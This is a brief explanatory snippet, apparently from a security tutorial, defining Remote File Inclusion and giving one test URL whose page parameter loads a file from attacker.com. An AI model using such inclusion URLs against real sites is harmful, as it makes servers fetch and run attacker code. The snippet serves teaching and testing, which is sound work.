RFI (Remote File Inclusion) is a web vulnerability where an attacker can include and execute a remote file (from an external server) on the vulnerable application,This happens when user input is used in file include functions without proper validation.

                                                                                   
                                                                                    Testing way Example


https://example.com/index.php?page=http://attacker.com/file.txt



